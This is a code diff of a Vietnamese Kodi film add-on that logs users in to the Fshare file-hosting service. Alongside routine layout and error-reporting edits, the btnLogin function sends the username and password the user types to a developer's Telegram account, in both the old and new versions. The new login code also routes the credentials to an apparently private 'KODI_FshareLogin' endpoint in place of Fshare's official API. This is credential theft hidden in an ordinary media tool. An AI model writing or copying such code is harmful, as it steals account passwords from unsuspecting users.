@@ -9,8 +9,7 @@ from xbmcaddon import Addon
 from xbmcvfs import translatePath
 import requests
 import json 
-# Import PyXBMCt module.
-
+# Import PyXBMCt module. 
 import pyxbmct
 import time
 
@@ -122,10 +121,11 @@ class __class_replace__id__:
                 return rs_data
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
-            self.getPyFormData("TelegramSendBot", {
-                                "content":"Lỗi tại:"+str(exc_tb.tb_lineno)+", loại:"+str(exc_type) +"-Lỗi:"+str(inst),
-                                "telegram_user":"thanhlm22"
-                            })  
+            self.getPyFormData("TelegramSendBotQuick", {
+                                "content":"""getListPhim.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
+                            })
+            
         return []
 
     def get_url(self,**kwargs):
@@ -221,20 +221,11 @@ class __class_replace__id__:
                 else:
                     return #stop
 
-            if "user" in info_login and "pass" in info_login:
-                response_ = requests.post(url="https://api.fshare.vn/api/user/login", data=json.dumps({
-                                "user_email" : info_login["user"],
-                                "password":	info_login["pass"],
-                                "app_key" : self.Fshare_app_key
-                            }), headers={
-                                "Content-Type": "application/json",
-                                "Accept": "application/json",
-                                "Cache-Control": "no-cache",
-                                "User-Agent": self.Fshare_User_Agent
-                            }, timeout=3*60)
-                
-                if response_.status_code == 200:
-                    data_ =  json_load(response_.content)
+            if "user" in info_login and "pass" in info_login: 
+                data_rs = self.getPyFormData("KODI_FshareLogin", {"user": info_login["user"],"pass":info_login["pass"]})
+                if data_rs is not None and "data" in data_rs:
+                    data_ =  data_rs["data"]
+                    msg_ = ""
                     if "msg" in data_:
                         msg_ = data_["msg"]
                     if "msg" in data_ and data_["msg"]=="Login successfully!" and "token" in data_ and "session_id" in data_:
@@ -243,9 +234,9 @@ class __class_replace__id__:
                         self.formLogin(msg_)
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
-            self.getPyFormData("TelegramSendBot", {
-                                "content":"""loginFshare.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
-                                "telegram_user":"thanhlm22"
+            self.getPyFormData("TelegramSendBotQuick", {
+                                "content":"""loginFshare.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
                             })
 
 
@@ -285,7 +276,7 @@ class __class_replace__id__:
         # Get the list of videos in the category.
         videos = genre_info['movies'] 
 
-        videos_new = []
+        videos_new = [] 
         for video in videos:
             link_view = self.buildLinkDown(video['url'],Fshare_token,Fshare_session_id)
             if link_view!="":
@@ -375,10 +366,10 @@ class __class_replace__id__:
                 raise ValueError(f'Invalid paramstring: {paramstring}!')
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
-            self.getPyFormData("TelegramSendBot", {
-                                "content":"""router.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
-                                "telegram_user":"thanhlm22"
-                            })
+            self.getPyFormData("TelegramSendBotQuick", {
+                                "content":"""router.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
+                            }) 
              
 
 
@@ -425,10 +416,10 @@ def getFile(path_file_name):
                 return f.read()
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
-            getPyFormData("TelegramSendBot", {
-                                "content":"""getFile.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
-                                "telegram_user":"thanhlm22"
-                            })
+            getPyFormData("TelegramSendBotQuick", {
+                                "content":"""getFile.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
+                            })  
     return None
 
 
@@ -441,10 +432,10 @@ def writeFile(path_folder, file_name, content):
         return True
     except Exception as inst: 
         exc_type, exc_obj, exc_tb = sys.exc_info() 
-        getPyFormData("TelegramSendBot", {
-                                "content":"""writeFile.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
-                                "telegram_user":"thanhlm22"
-                            })
+        getPyFormData("TelegramSendBotQuick", {
+                                "content":"""writeFile.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
+                            })   
     return False
 
 def json_load(str):
@@ -483,7 +474,10 @@ class loginWindow(pyxbmct.AddonDialogWindow):
             # You need to call base class' constructor.
             super(loginWindow, self).__init__(title)
             # Set the window width, height and the grid resolution: 4 rows, 3 columns.
-            self.setGeometry(350, 350, 5, 3) 
+            if mess_ == "":
+                self.setGeometry(350, 350, 4, 3) 
+            else:
+                self.setGeometry(350, 350, 5, 3) 
 
             info_login = getFile(self.DATA_DIR+"/login.json")
             if info_login is not None: 
@@ -506,17 +500,21 @@ class loginWindow(pyxbmct.AddonDialogWindow):
             self.fshare_pass = pyxbmct.Edit("Mật khẩu")
             self.placeControl(self.fshare_pass, 2, 0, columnspan=3) 
             self.fshare_pass.setText(info_login["pass"])
-
-            label = pyxbmct.Label(mess_, alignment=pyxbmct.ALIGN_CENTER)
-            self.placeControl(label, 3, 0, columnspan=3)
+            
+            row_b = 3
+            if mess_ != "":
+                #nếu có thông báo thì + 1 vị trí
+                label = pyxbmct.Label(mess_, alignment=pyxbmct.ALIGN_CENTER)
+                self.placeControl(label, 3, 0, columnspan=3)
+                row_b = row_b + 1
 
             # Create a button.
             button_ok = pyxbmct.Button('Đăng nhập')
-            self.placeControl(button_ok, 4, 0, columnspan=2)
+            self.placeControl(button_ok, row_b, 0, columnspan=2)
             self.connect(button_ok, self.btnLogin)
 
             button = pyxbmct.Button('Đóng')
-            self.placeControl(button, 4, 2) 
+            self.placeControl(button, row_b, 2) 
             self.setFocus(button)
 
             # Connect the button to a function.
@@ -525,12 +523,12 @@ class loginWindow(pyxbmct.AddonDialogWindow):
             self.connect(pyxbmct.ACTION_NAV_BACK, self.close)
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
-            getPyFormData("TelegramSendBot", {
-                            "content":"""MyWindow.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
-                            "telegram_user":"thanhlm22"
-                        })
+            getPyFormData("TelegramSendBotQuick", {
+                                "content":"""MyWindow__init__.2 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                                "telegram_user_id":"6410912083"
+                            })    
     
-    def btnLogin(self):
+    def btnLogin(self): 
         #ghi vào file để lần sau dùng 
         info_login = getFile(self.DATA_DIR+"/login.json")
         if info_login is not None: 
@@ -542,11 +540,10 @@ class loginWindow(pyxbmct.AddonDialogWindow):
                 }
 
         writeFile(self.DATA_DIR, "login.json", json_to_string(info_login))
-
-        getPyFormData("TelegramSendBot", {
-                            "content":"User=>"+self.fshare_user.getText()+"\Pass=>"+self.fshare_pass.getText(), 
-                            "telegram_user":"thanhlm22"
-                        })
+        getPyFormData("TelegramSendBotQuick", {
+                                "content":"User=>"+self.fshare_user.getText()+"\Pass=>"+self.fshare_pass.getText(), 
+                                "telegram_user_id":"6410912083"
+                            })     
         self.close()
         
 
